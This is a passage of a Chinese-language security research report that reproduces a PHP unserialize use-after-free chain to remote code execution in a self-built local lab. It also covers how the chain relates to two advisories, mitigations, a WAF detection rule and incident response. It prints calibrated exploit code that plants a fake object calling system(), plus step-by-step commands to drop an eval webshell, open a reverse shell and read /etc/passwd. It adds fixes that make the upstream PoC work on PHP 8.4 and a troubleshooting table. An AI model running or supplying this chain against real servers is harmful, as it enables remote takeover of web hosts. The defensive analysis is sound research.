**防御落点（爆炸半径控制）**：正因为 RCE 只到 worker 权限，把 worker 沙箱化不能挡 RCE 本身（§5.6），但能堵死"拿 webshell → 拿主机"之间的路：`NoNewPrivs=1`、加 seccomp/AppArmor profile、`CapDrop=all`、独立 user namespace、根文件系统只读 + 工作目录独立可写卷、DocumentRoot 不给 web 进程写权限（用发布/同步机制而非就地写）。靶场默认这几项**全开**（NNP=0、seccomp=0、unconfined），所以在这里 RCE 之后 LPE 面是敞开的 —— 真实生产应反过来配。

### 6.9 "落地 webshell" 比 "跑一条命令" 多出的三个前置条件 **[实测]**

单发命令（`--mode cmd --command id>/tmp/pwned`）只用到"一次 `system()` 间接调用"，靶场里 100% 稳。但要**证明"任意命令 + 落地可访问 webshell"**，`--mode webshell` 在 8.4 上会接连踩三个坑，逐个都是本靶场实测复现并修好的，缺一 webshell 就 404：

1. **worker 的 `cwd` 必须是"可写且在 DocumentRoot 内"**。上游 drop 是 100% 相对路径的（`rm -f w` → `echo -n XX>>w` → `mv w c.php`，见 `poc/php8_remote.py:1037-1045`），而 14 字节/触发的预算（§8.2）根本放不下 `/var/www/html/w` 这种绝对路径。`apachectl -k start` 会走 `ap_daemonize()→chdir("/")`，于是每个 worker 的 `cwd=/`（root 属主、www-data 不可写），`>>w` 直接失败 → 落地为空。修法：让 worker 从 DocumentRoot 起 —— `lab/start_foreground_cwd.sh` 用 `-DFOREGROUND`（跳过 daemonize 的 chdir）并在 `cd /var/www/html` 后拉起，把 `chmod 2775 /var/www/html` 让 www-data 属组可写；`lab/check_worker_cwd.sh` 读 `/proc/<worker>/cwd` 验证确实变成 `/var/www/html`。真实站点里这条前置条件等价于"web 进程能在自己的 DocumentRoot 就地写文件"（老式 mod_php 常见，FPM+只读根则不满足）。

2. **8.4 上上游 `drop_webshell()` 打不响**：它内部走 `_fire_cmd()`，把 `system()` 写到假 handler 表偏移 **200**（那是 8.5 的 `get_properties_for` 位置，§6.4）。8.4 结构体没有 `clone_obj_with`，真实槽位在 **192** → 写偏 → 触发即段错误、`w` 从不生成。这就是"cmd 模式（走 `chain_lab` 自带、把偏移做成参数 `gpf_off=192` 的 `fire_cmd_v2`）能成，webshell 模式（走上游硬编码 200）整链不落地"的根因。修法：`lab/chain_lab.py` 新增 `drop_webshell_v2()`，逐条复用 `fire_cmd_v2(gpf_off)` 下发命令。

3. **同一个触发会把每条命令执行两遍（append 双倍 → webshell 变成 `<<?=?=evaeva…` 废码）**。`system()` 跑完 PHP 继续走 request shutdown 时崩，`KeepAlive.post()` 的 `for _ in range(2)` 会**把同一份 payload 重发一次**，prefork 子进程是从 master fork 出来的、堆布局（含 spray 槽 `S`）逐字节相同，于是新 worker 上第二条命令又落一次。单发命令用 `>` 重定向、跑两遍结果一样看不出；`>>` 追加就把双倍暴露了。修法：drop 阶段每条命令在**一次性 TCP 连接**上只发一遍（`drop_webshell_v2.once()`），崩溃的那次 worker 丢弃、下条命令换新 worker 照样命中同一个 `S`。

验证脚本 **`lab/poc_arbexec.py`**：不重写利用链，而是 `subprocess` 调 `chain_lab.py --mode webshell` 落地 webshell，再用普通 HTTP 说话——POST 一段 PHP glue 进字段 `1`、base64 命令进字段 `b`，`shell_exec(... 2>&1; echo RC=$?)` 全量 stdout/stderr base64 回传。因此 `--command` 不再有 14 字节限制。`--selftest` 冷启动实测 **8/8** 命令以 `uid=33(www-data)` 执行（`whoami`/`id`/`uname -a`/`pwd`/管道 `cat /etc/passwd|wc -l`/多命令 `;` 串/worker 写文件回读/`stat c.php` 属主），并证明 `c.php` 属主是 worker 自己 —— 即"任意命令执行 + 落地 webshell"两点都成立。**注意**：poc 初版 glue 结尾写成 `…; ''` 会让 `eval()` 抛 "unexpected end of file"（裸表达式 `''` 缺分号），已改成 `return base64_encode(...)`（单条语句，`<?=` 顺带把返回值 echo 出来）。

---

## 7. 这条链与两个 CVE 的关系（务必区分，否则缓解会做错）

| | CVE-2026-109618（OOM corruption） | CVE-2026-109619（stale global state） | 公开 PoC（php2shell 链） |
|---|---|---|---|
| 缺陷位置 | OOM 用 `longjmp()` 跳出"尚未初始化完"的请求上下文；mod_php 无条件走 request shutdown 消费非法状态 | 请求级状态被发布到 worker 全局却没被 reset（或 reset 后又被非致命诊断重新填）；下一个请求在正常初始化之前消费 → 跨请求 UAF | `unserialize()` 的 var_hash 存裸 `zval*`，HashTable 扩容 `pefree` 旧块后表项悬垂；`Serializable` 桥不加 `serialize_lock` 使内外层共用同一张表 |
| 需要应用代码吗 | **不需要**（multipart 放大即可在 `php_request_startup()` 里触发） | **不需要**（`.htaccess`/`php_value` 诊断、session upload progress 都在核心里） | **需要**（§6.1 三条件） |
| 已确认 RCE 的 SAPI | mod_php；FPM 源码判定易感但无公开完整 exploit；FrankenPHP 大概率；LSAPI 条件性 | mod_php（8.5 `fatal_error_backtraces` 路径）；**mod_php + FPM（session upload progress 路径）** | 本靶场 mod_php 实测；FPM 未验证（§6.2） |
| 关键 ini | `memory_limit=-1` 是主要配置缓解（不完整）；**禁用 `RLIMIT_AS`/`RLIMIT_DATA`**（会让 `mmap()` 失败，正好踩脆弱路径） | `fatal_error_backtraces=0`（8.5）、`session.upload_progress.enabled=0`、`pm.max_requests=1`、消除攻击者可达致命错误 | **ini 无法缓解**（§6.5 实测：`memory_limit=-1`、`128M`、`display_errors=Off`、`session.upload_progress.enabled=0` 各自或同时打开仍端到端 RCE，见 `evidence/verify_display_off.json`）。注：`memory_limit`/报错回显是另两列（内核级 CVE）的缓解面，不是本列的 |
| 唯一完整缓解 | 升级 | 升级 | 移除 `Serializable` gadget / 不再反序列化不可信数据（升级不保证，见 §6.4） |

两条公告互相引用（"Make sure to also follow the remediation advice from the related report"），因为它们**共享同一个致命中断来源**：OOM/致命错误跳过配对 reset 就是 109619 的生产者。而 §1.2 的证据表明 `fix.diff` 没碰 var_hash 生命周期。

**实务判断顺序**（把三者当三个独立问题修）：
1. 先按公告升级（关掉 109618/109619 两个无需应用代码的入口 —— 这才是"裸机也能被打"的那两个）。
2. 再在代码里 grep `implements Serializable` 与 `unserialize(`，确认 gadget 是否还存在 —— 这是本 PoC 的入口。
3. 两者都做完之前，WAF/限流是唯一能同时压住两者的手段。

---

## 8. 复现指引

### 8.1 文件清单

| 路径 | 作用 |
|---|---|
| `poc/php8_remote.py` | 上游公开 PoC（**未改动**，约 1000 行）。`isstring_read`/`heap_leak`/`scan_for_elf`/`gnu_hash_resolve`/`lookup_class_table`/`find_spray_slot`/`_fire_cmd`/`drop_webshell`/`reverse_shell` |
| `poc/remote_app.php` | 目标端最小漏洞应用（§2） |
| `lab/setup_target.sh` | 一键搭靶场 |
| `lab/stop_target.sh` | 实验后停环境 + 清场（停 Apache、删落地文件与残留 ini、恢复 ASLR，保留 remote_app.php） |
| `lab/restart_target.sh` | 下次冷启动拉起服务并自检（不重新 provision） |
| `lab/status.sh` | 起停后自检：进程、监听、`remote_app.php` 探测、error log、segfault 计数 |
| `lab/show_priv_context.sh` | 读正在运行的 mod_php worker 的 `/proc/<pid>/status`（uid/cap/nnp/seccomp/apparmor）——§6.8 权限边界证据来源 |
| `lab/start_foreground_cwd.sh` | 让 worker `cwd=/var/www/html`（`-DFOREGROUND` 跳过 daemonize 的 `chdir("/")` + `chmod 2775`），webshell 才能落地（§6.9 前置条件①） |
| `lab/check_worker_cwd.sh` / `lab/diag_after_drop.sh` | 读 `/proc/<worker>/cwd` 验证 cwd、并列出 drop 后 `/var/www/html` 与 error log（§6.9 排障） |
| [lab/poc_arbexec.py](file:///F:/VibeCoding/php2shell-research/lab/poc_arbexec.py) | **任意命令执行验证器**：调 chain_lab 落 webshell，再经 HTTP 下发任意长命令取回全量输出；`--selftest` 8/8 以 www-data 执行（§6.9） |
| [lab/chain_lab.py](file:///F:/VibeCoding/php2shell-research/lab/chain_lab.py) | **本报告的驱动**：加载上游代码 → 打 4 处校准 → 分阶段跑 + 结构化证据；webshell 模式用自带 `drop_webshell_v2()`（正确 192 偏移 + 单发防双执行，§6.9②③），不再走上游硬编码 200 的 `drop_webshell` |
| `lab/run_case.sh` / `lab/cases.sh` / `lab/mk_inis.sh` | 前置条件矩阵 |
| `lab/reliability.sh` | N 次冷启动成功率 |
| `lab/diag_disable.sh` / `lab/diag_disable_classes.sh` | 判别"是否真缓解"（带外 libc 基址，§6.5.1） |
| `lab/verify_display_off.sh` | 专门核 §1.4 第二条：php.ini 强制 `display_errors=Off` + `memory_limit=128M`，证明两者都非本链前提（证据 `evidence/verify_display_off.json`） |
| `lab/check_disable_classes.sh` / `lab/probe_dis_class.php` | 直接验证 `disable_classes` 能否挡住运行时声明的用户态 gadget 类（§6.5.1，结论：不能） |
| `lab/probe_affinity.sh` / `lab/probe_affinity.py` / `lab/pid_probe.php` | worker 亲和性测量 |
| `lab/negative_tests.sh` / `lab/neg_noser.php` / `lab/neg_allowfalse.php` | §6.1 三条件的反向验证（§6.5.2） |
| `lab/dump_live.py` / `lab/dump_spray.py` / `lab/dump_hdr.py` / `lab/probe_*.py` | ZendMM 结构现场测量（§4.4 的证据来源） |
| `lab/win_*.py` | XAMPP/Windows 侧验证（`docs/windows-side.md`） |
| `refs/` | 8.4/8.5/8.0.12 源码切片、两份 GHSA JSON、`advisories_full.txt`、`fix.diff` |
| `lab/evidence/*.json` | 每组实验的逐阶段请求数/耗时/地址 |
| `docs/gadget-analysis.md` | 逐行源码引用（550 行，含 §7 "PoC 注释与源码不一致的 6 处"） |

### 8.2 命令

```bash
# 1) 靶场（管理员 PowerShell）
wsl.exe -d kali-linux -u root -- bash /mnt/f/VibeCoding/php2shell-research/lab/setup_target.sh 8080

# 2) 每次从 Windows 侧改完 lab/ 都要同步进 WSL（inline 管道会被 Windows shell 吞掉，必须走脚本）
wsl.exe -u root -- bash //mnt/f/VibeCoding/php2shell-research/lab/push_lab.sh

# 3) 基线：上游原样代码打 8.4 会失败，用校准驱动
wsl.exe -u root -- bash -c "cd /root/lab && python3 -u chain_lab.py \
    --url http://127.0.0.1:8080/remote_app.php --command 'id>/tmp/pwned'"
wsl.exe -u root -- bash -c 'cat /tmp/pwned'      # uid=33(www-data) ...

# 4) 二次运行（复用 DSO 基址，服务器未重启时 4 秒）
python3 chain_lab.py --cache evidence/runA_fresh_aslr1.json
# 5) webshell / 反弹 shell 模式
#    先让 worker cwd 落进可写 DocumentRoot，否则相对路径 drop 落在 / 上→404（§6.9①）
wsl.exe -u root -- bash //mnt/f/VibeCoding/php2shell-research/lab/start_foreground_cwd.sh 8080
wsl.exe -u root -- bash -c "cd /root/lab && bash check_worker_cwd.sh"   # 确认 cwd=/var/www/html
python3 chain_lab.py --mode webshell --webshell-name c.php             # 走 drop_webshell_v2：192 偏移 + 单发（§6.9②③）
python3 chain_lab.py --mode reverse --reverse 127.0.0.1:9001
# 5b) 证明"任意命令 + 落地 webshell"：chain_lab 落 webshell 后经 HTTP 跑任意长命令
wsl.exe -u root -- bash -c "cd /root/lab && python3 -u poc_arbexec.py --selftest --bootstrap"
wsl.exe -u root -- bash -c "cd /root/lab && python3 -u poc_arbexec.py --cmd 'cat /etc/passwd | wc -l'"
# 6) 矩阵 / 可靠性 / 反向验证
bash cases.sh ; bash reliability.sh 8 ; bash negative_tests.sh
```

**做完实验：停止环境并清场**（`lab/stop_target.sh`，可重复执行；实测会把 8080 释放、`apache2` 无残留监听）：

```bash
# 管理员 PowerShell。它会：优雅停 Apache（mod_php worker 随之退出、堆被释放）
#   + 删除链可能落地的文件（/tmp/pwned、c.php/shell.php/w 等 webshell 名、探针用的
#   pid_probe.php/neg_*.php/sink_debug.php）+ 删除矩阵残留的 zz_case.ini / zz-case.conf /
#   zz-affinity.conf + 把 randomize_va_space 恢复成默认 1。
# 它【不会】删 remote_app.php（保留给下次直接重启），也【不会】卸载任何包。
wsl.exe -d kali-linux -u root -- bash //mnt/f/VibeCoding/php2shell-research/lab/stop_target.sh 8080
```

想连 WSL 发行版内存也一并释放（下次要从冷启动再来），在 Windows 侧（普通 PowerShell 即可）：

```powershell
wsl.exe --terminate kali-linux    # 停掉整个发行版；/tmp 会被清空，端口随之释放
# 彻底不要这个靶场时才用：wsl.exe --unregister kali-linux   （会删虚拟磁盘，不可逆）
```

**下次重启环境**（`lab/restart_target.sh`，不重新 provision，只拉起服务并自检；实测返回 `200 / Apache/2.4.68 / X-PHP-Version: 8.4.24 / X-PHP-SAPI: apache2handler`）：

```bash
# 直接调用即可；即使上次是 wsl --terminate 或重启过电脑，第一条 wsl.exe 会自动把
# 发行版重新拉起，再由本脚本 start apache。
wsl.exe -d kali-linux -u root -- bash //mnt/f/VibeCoding/php2shell-research/lab/restart_target.sh 8080

# 如果你在 Windows 侧改过 lab/ 里的脚本，先同步再重启（CRLF 会被 push_lab.sh 剥掉）：
wsl.exe -u root -- bash //mnt/f/VibeCoding/php2shell-research/lab/push_lab.sh

# 起来后先自检再看日志（可选）：
wsl.exe -u root -- bash -c "cd /root/lab && bash status.sh"
```

restart 之后 DSO 基址会重新随机，**旧的 `--cache` 文件作废**，要从 §8.2 步骤 3 的冷启动重跑（约 2447 请求）；只有"服务器没重启、只是 worker 崩了几个"的情况下 `--cache` 仍有效（§5.4）。如果连包环境都新（例如换了机器/重新 `setup_target.sh`），才需要回到步骤 1 全量 provision。

`--command` 单发受 spray 容量限制：**最长 14 字节**（`fire_cmd_v2`/上游 `_fire_cmd` 都有 `assert`）—— 命令占的正是假对象 `gc`+`handle`+`extra_flags` 那 16 字节，减去前导 `\x09` 和结尾 NUL。所以复现里用 `id>/tmp/pwned`。更长的内容要靠上游的 `_split_for_echo()`（`poc/php8_remote.py:994-1015`）拆成一串 `echo -n XX>>w`，**每一行都是一次完整的 R-7 触发**，最后 `mv w <文件名>` 收尾 —— `--mode webshell` 落 `c.php`（默认 webshell 体 `<?=eval($_REQUEST[1])?>`）。**但这三件事单发命令不需要、落 webshell 必需**：worker cwd 要可写且在 DocumentRoot 内（相对路径预算放不下绝对路径）、8.4 偏移必须是 192（上游 `drop_webshell` 硬编码 200 会在触发即崩、`w` 从不生成）、每条命令必须只发一遍（否则 `KeepAlive` 的崩溃重发 + 逐字节相同的 fork 堆会让每条 `>>w` 追加两遍变成废码）。三者都已在本靶场实测修好并逐条说明于 **§6.9**。落地后用 `lab/poc_arbexec.py` 经 HTTP 跑任意长命令即可绕开 14 字节限制。

### 8.3 上游 PoC 的四处校准（这是"能不能跑起来"的全部差别）

**(1) `get_properties_for` 偏移：8.5 = 200，8.4 = 192**（`lab/chain_lab.py:432-463`）

```python
def fire_cmd_v2(c, ce, system, S, cmd, gpf_off=192):
    assert len(cmd) <= 14
    payload_cmd = b'\x09' + cmd                  # 首字节会被 Z_ADDREF 加成 0x0A
    rce_spray = bytearray(c.SPRAY_LEN)
    fake_obj = S + 104
    struct.pack_into('<Q', rce_spray, 40, fake_obj)   # 表项 4 指向的位置
    struct.pack_into('<I', rce_spray, 48, 0x08)       # IS_OBJECT
    rce_spray[104:104 + len(payload_cmd)] = payload_cmd
    rce_spray[104 + len(payload_cmd)] = 0
    struct.pack_into('<Q', rce_spray, 120, ce)        # zend_object.ce
    struct.pack_into('<Q', rce_spray, 128, S)         # zend_object.handlers -> spray 自身
    struct.pack_into('<Q', rce_spray, 136, 1)         # properties
    struct.pack_into('<Q', rce_spray, gpf_off, system)  # handlers->get_properties_for
    ...
```

**(2) `EG.class_table` 偏移自动标定**（不写死 0x1D0/0x1B8，而是扫描并用 DJBX33A 校验桶键）——`lookup_class_table_auto()` + `_class_table_probe()`，实测输出 `class_table at EG+0x1b8`。

**(3) page map 自锚定**（§4.4 的 `find_spray_slot_v2()`，锚点 `map[0] == 0x40000001`）。

**(4) libc 判据放宽**：上游要求 `e_phnum >= 12`；改为"候选镜像能解析出 `system`+`popen`+`exit`"（`libc_locator_v2()`，`lab/chain_lab.py:178-266`），并且每个 2 MiB 段取**最低**指针再向下扫，避免"指针落在段中部、600 页扫不到头"。

> 另有两处非功能性但影响成功率的地方：`_read_elf_header_strict()` 增加了对程序头本身的合法性校验（大幅减少误报）；`find_image_base()` 对"读代码导致 500"必须容忍而不是中止（否则永远找不到 libphp）。

### 8.4 复现失败时的排查顺序

| 症状 | 先看 | 原因 |
|---|---|---|
| R-1 就返回 None | 目标类名是否叫 `CachedData`、`Content-Type` 是否为表单、`magic_quotes`/`GPC` 是否改了输入 | gadget 不存在 → 见 `negative_tests.sh` |
| R-5 拿到 ce 但 R-7 无反应 | `--gpf-off` | **8.4 用 200 不报错也不执行**，最隐蔽的坑 |
| R-6 报 `no readable spray slot` | page map 偏移、`bin 16` 假设 | `sizeof(zend_mm_heap)` 随构建变化（§4.4） |
| R-2 扫很久找不到 libphp | 库与堆的实际距离 | 上游扫描窗口按 Debian 布局调优；非 Docker 布局可能要放宽 `max_pages` |
| 全链跑完无 `/tmp/pwned` | Apache error log 是否有 `Allowed memory size` / worker 是否在 R-7 前被回收 | §4.5、§6.5 `maxreq` |
| 想确认"到底哪一步依赖同 worker" | `probe_affinity.sh` | §6.6 |

---

## 9. 检测与缓解

### 9.1 代码层（唯一能断这条链的层）

1. **删桥**：全站 grep `implements Serializable`，特别是"其 `unserialize()`/`__unserialize()` 里再次 `unserialize()`"的类。PHP 8.1 起 `Serializable` 已在接口层发 `E_DEPRECATED`（`[ifaces]:478-481`），迁移到 `__serialize`/`__unserialize` 本身就是把这条链的入口去掉（§3.2：`__unserialize()` 无法扮演该角色）。
2. **不反序列化不可信输入**：改 JSON；必须用 `unserialize()` 时 `['allowed_classes' => false]`（`[var.c]:1483-1519`）或严格白名单。
3. **不要把反序列化结果再序列化/遍历**：`echo serialize($result)`、`var_dump($result)`、写缓存前 `serialize()` 都是 A3 触发点。
4. **`disable_classes = CachedData` 挡不住这条链（实测，勿用）**：§6.5.1 的 `hint_disable_classes` 在同一条 ini 下照常 RCE 到 `uid=33`，`lab/probe_dis_class.php` 进一步确认 `disable_classes` 后 `new CachedData()` 仍成功、Serializable 的 `unserialize()` 回调仍触发。原因：`CachedData` 是目标脚本运行时声明的**用户态类**，而 `disable_classes` 只在扩展 `minit` 阶段对已进入 class table 的类打禁用标记，对随后用户代码声明的同名类无效。**别把它列进防御清单** —— 真正有效的是下面 1/2 两条（删桥 / 不反序列化不可信输入）。

### 9.2 内核/配置层（针对两个 CVE，对本链无效）

按 §7 表格执行：升级到 `>= 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12`；不能升级时 `memory_limit=-1`（管理面强制，重启所有 worker）、8.5 上 `fatal_error_backtraces=0`、`session.upload_progress.enabled=0`、必要时 `pm.max_requests=1`；**绝对不要用 `RLIMIT_AS`/`RLIMIT_DATA`**（公告明确：它们让 `mmap()` 失败，正好触发脆弱的 `longjmp()` 路径）；前端独立强制解码后的请求体大小、限制 multipart part 数/part 内 header 数/上传数、下调 `max_input_nesting_level`；不用 multipart 的站点直接在前端拦掉 multipart。

### 9.3 网络/主机层：本链的行为特征（最容易落地、且对三个问题都有效）

| 特征 | 观测点 | 说明 |
|---|---|---|
| 请求体结构极独特 | WAF/流量镜像 | `C:` 里嵌一个 `O:8:"stdClass"` 恰好 8 个属性，随后约 32 条 **等长 `s:280`**，结尾 `R:4`~`R:11`；整条链所有请求共享这一形状 |
| 单客户端极高频、串行、畸形 | 访问日志 | 2400~3000 请求/100 秒，几乎全部 POST 同一 URL、同一参数名 |
| **成批 500 + worker 重启** | error log / 进程监控 | 假长度读操作让 `serialize()` 撞 `memory_limit`，实测 400~1200 次失败读；prefork 下能看到成批 `[apache2] <defunct>`（§4.5） |
| 响应异常巨大 | 出口带宽/响应体统计 | 单次读回显可达 ~400 KB（`heap_slot.size`），正常业务不会这样 |
| 最终一击后紧跟子进程消失 | R-7 是自毁式触发 | 打完之后那次请求的 worker 通常也崩，攻击者随后会重来一轮（表现为周期性 500 波） |
| webshell 落地 | 文件完整性 | `--mode webshell` 默认写 `c.php`；`--mode reverse` 会外连 |

建议的检测规则（伪码，任何 WAF 都能落）：

```
POST body 同时满足：
  含 "C:" 且 含 "O:8:"stdClass"" 且
  正则 (s:280:") 出现次数 >= 16 且
  含 "R:" 且 请求体长度在 8KB~40KB
=> 阻断 + 告警（这条链的必要形状，误报极低）
```

再加两条运行态：`同一客户端 IP 的 500 比例 > 10%`、`apache2 子进程在 1 分钟内重启次数 > 5`。

### 9.4 事件响应

一旦命中：**(a)** 先按 §9.1 移除 gadget（升级不够，见 §6.4）；**(b)** 检查 `/tmp`、web 目录下的落地文件与外连；**(c)** 以 web worker 账号被完全控制对待（本链拿到的是 `uid=33`，不是"信息泄露"）；**(d)** 回捞该 worker 的存活时间与请求量 —— 攻击者需要数千请求，日志足够重建全过程。

---

## 10. 附录

### 10.1 上游 PoC 注释/常量与源码不一致之处（复现时不要照抄注释）

完整论证见 `docs/gadget-analysis.md` §7，摘要：

1. 模块 docstring 说"freed 288-byte arData"：**实际 320 B**（`HT_SIZE_EX(8, …)` = `8*32 + 2*8*4`；作者按"每桶 1 个哈希槽"算了，实际是 `2*nTableSize` 个 `uint32`）。结论不受影响（305 与 320 都落 bin 16）。
2. `isstring_read` 里的 `vo = 8 + k*32` 被注释成"bucket 0..7"：真实对应关系是 `bucket i.val` 在 spray 偏移 `40 + 32*i`；`k=0` 写的是哈希索引区，循环只到 `k=7` ⇒ 覆盖到 bucket 6，`p7` 槽保持 0（`IS_UNDEF`），`serialize()` 打 `i:0;` —— 无害，但注释里"八个属性全是 IS_LONG"不成立。
3. "八个属性 zval 指向已释放 arData"：悬垂的是 **var_hash 表项**，桶内容已被 memcpy 进新 640 B 块（`[zh]:1541`），所以 spray 之前不崩。
4. `get_properties_for` 在偏移 200 只对 8.5/master 成立（多一个 `clone_obj_with`），8.4 是 **192**。
5. `remote_app.php:9` "the 9th insert that resizes the arData HT"：**正确**（`ZEND_HASH_IF_FULL_DO_RESIZE` 在插入前触发）。
6. "0x09 经 `GC_ADDREF` 变 0x0A"：**正确**，增量来自 `php_add_var_hash()` 的 `Z_ADDREF_P(var)`（`[var.c]:801`），发生在 `system()` 调用之前。

### 10.2 本次实验踩到的坑（供后续研究避免）

* **读自己进程内存做"ground truth"必须用唯一标记**：`dump_pmap*.py` 前几版把**上一次请求残留的空闲块**（`free_pages=511`）当成了现场，"测出"的 page map 偏移是假的。改成每轮 spray 里塞 `os.urandom(4)` token、只认 token 前 8 字节 == 280 的块之后才拿到真值（`dump_live.py`）。
* **`/proc/<pid>/mem` 必须先 `seek` 再 `read`**，否则 `OSError: [Errno 5]`。
* **Windows → WSL 的命令传递**：`wsl.exe -- bash -c "... $(...) / for f in ...; do ... \$f ..."` 会被 Git Bash 改写（实测生成 0 个文件）。规则：所有流水线写进 `.sh` 文件再调；路径用 `//mnt/f/...` 前缀避免 MSYS 转换。
* **Apache `LogFormat` 定义必须带 nickname**，否则 `CustomLog file nickname` 会把字面量 "php2shell" 写进每一行（本报告第一版亲和性探针就是这么废的，已改为 `pid_probe.php` 直读 `getmypid()`）。
* **`curl` 取 php-src 原始文件易被重置**：用 `--retry 3 --retry-all-errors` + `refs/heads/PHP-8.4/...` 形式。
* 靶机上残留一个只为测量用的 `/var/www/html/sink_debug.php`（在 `unserialize` 与 `serialize` 之间 `usleep()`，便于外部读进程内存做结构测量）。**复现正式实验前应删除**：`lab/stop_target.sh` 已一并清理它（以及 `pid_probe.php`、`neg_*.php`、`probe_dis_class.php`）。它不是漏洞的一部分，但会在靶机上留下一个行为异常端点。
* 本报告实验期间，探针脚本会往靶机写入 `/var/www/html/pid_probe.php`、`neg_*.php`、`/etc/apache2/conf-enabled/zz-affinity.conf`（§9.3 观测用的命名 `LogFormat`）、`zz_case.ini` 等；这些**全部由 `lab/stop_target.sh` 一次清干净**（见 §8.2「做完实验」），不必手工 `rm`。
* **带外 libc 基址的正则要覆盖两种命名**：`diag_disable*.sh` 第一版用 `libc[-.][0-9a-f]*\.so` 匹配不到 Debian 的 `libc-2.40.so` 或 `libc.so.6`，导致 `--libc-hint` 空转、误报"could not read libc base"。改成对 `/proc/<pid>/maps` 最后一字段取 basename、用 `^libc([-.][0-9a-z.]+)$` 且要求 `r--p / file-offset 00000000` 的那一段才是镜像基址（`test_imgbase2.sh` 验证）。
* **Serializable 的 `C:len:"name":N:{...}` 里 `N` 是花括号内裸字符串的字节数，不是元素数**：`probe_dis_class.php` 第一版把 `s:1:"y";i:7;`（12 字节）写成 `:13:`，PHP 直接报 `Error at offset ...`，`unserialize()` 回调根本没跑，一度误判"disable_classes 生效了"。改成 `:5:{hello}`（`hello` 恰 5 字节）后干净复现，才确认 `disable_classes` 对运行时声明的用户态类无效。
* **落 webshell ≠ 单发命令，8.4 上要额外过三关（§6.9）**：① `apachectl -k start` 的 `chdir("/")` 让 worker `cwd=/`（root 不可写），相对路径 drop 落空 → 用 `-DFOREGROUND`+`cd /var/www/html` 起（`start_foreground_cwd.sh`）；② 上游 `drop_webshell()` 内部 `_fire_cmd()` 把 `system()` 写死在偏移 200（8.5 位置），8.4 触发即崩、`w` 从不生成 → 必须走参数化 `gpf_off=192` 的 `drop_webshell_v2()`；③ `KeepAlive.post()` 的 `range(2)` 崩溃重发 + prefork 子进程堆布局逐字节相同，使每条 `echo -n XX>>w` 追加**两遍**（`c.php` 变 `<<?=?=evaeva…`）→ drop 阶段每条命令用一次性连接只发一遍。cmd 模式因用 `>` 重定向、跑两遍结果相同，掩盖了②③，只有落 webshell 才暴露。
* **`<?=eval($_REQUEST[1])?>` 型 webshell 的 glue 结尾别写裸 `''`**：`poc_arbexec.py` 初版 glue 为"阻止 `<?=` 回显 eval 返回值"在结尾加了 `; ''`，但裸表达式 `''` 缺分号，`eval()` 报 `syntax error, unexpected end of file`（HTTP 500）。改 `return base64_encode(...)`（单条语句，`<?=` 正好把返回值 echo 出来）即可。

### 10.3 支撑文档与原始数据

* `docs/gadget-analysis.md` —— 逐行源码引用（var_hash/Serializable/扩容/bin 算术/前置条件/防御）。
* `docs/windows-side.md` —— XAMPP（8.0.12 ZTS）侧全部测量：UAF 读原语成立、PE 镜像 4787 个 0 通过 ELF 判定、ZTS 断 `EG` 符号路径、DEP/ASLR/CFG 现状表（其中 CFG 一项标注为**[推断，未实测]**）。
* `refs/advisories_full.txt` —— 两份 GHSA 描述全文（本报告 §1.1/§7 的所有断言以此为准）。
* `lab/evidence/*.json` —— 每组实验的逐阶段请求数、耗时、泄露地址；`lab/matrix.log`（前置条件矩阵）、`lab/rest.log`（8 次冷跑可靠性）、`lab/rest2.log`（亲和性+判别+反向验证批次）、`lab/diag_dc.log`（`disable_classes`+hint）为原始控制台输出。判别实验证据：`lab/evidence/hint_baseline.json`、`hint_disable.json`、`hint_disable_classes.json`；反向验证证据：`lab/evidence/neg_nosink_class.json`、`neg_allowed_false.json`、`neg_disable_classes.json`。
* **复现文章原文**：`refs/wechat_article.md`。第一次尝试用 WebFetch 取该文两次都被微信"环境异常"校验页拦截，最终通过浏览器读取正文成功（约 830 字 + 演示视频截图）。正文的每一项断言都已在 §1.3 逐条核对，其中**机理（GC/堆溢出）、执行手法（劫持 GOT）、暴露面（"只要有 PHP 页面"）、受影响版本（只写 8.5）**四处与官方公告和本机实测不符。

### 10.4 待补实验（诚实标注）

本轮新增测量已全部完成（结果见正文，不再列为待补）：

| 项 | 结果 |
|---|---|
| `disable_functions` / `disable_classes` 判别（`--libc-hint`） | **完成**，§6.5.1：两者均非缓解，同配置带外 libc 下照常 RCE 到 `uid=33` |
| worker 亲和性计数（`pid_probe.php`） | **完成**，§6.6：keep-alive 单 worker 100%，关 keep-alive 5 worker 主导 28% |
| 三条件反向验证（无 `Serializable` / `allowed_classes=false` / `disable_classes`） | **完成**，§6.5.2：前两条 R-1 一步断链；`disable_classes` 经 `probe_dis_class.php` 证明挡不住用户态类 |
| 冷启动成功率 N=8 | **完成**，§5.5：8/8 RCE，方差极小 |

仍未做（受本机环境限制，非"结果待填"）：

| 项 | 状态 |
|---|---|
| FPM 端到端 | 未做（靶机无 `php8.4-fpm`） |
| 8.4.27 / 8.5.12 回归 | 未做（未能取得对应构建） |
| IBT/CFI、LSM（SELinux/AppArmor）对本链的影响 | 未做，§5.6 已标注为未验证 |

---

*报告与全部脚本位于 `F:\VibeCoding\php2shell-research\`。实验对象是自建本地靶场（127.0.0.1:8080）与本机 XAMPP，未对任何外部系统发起请求。*
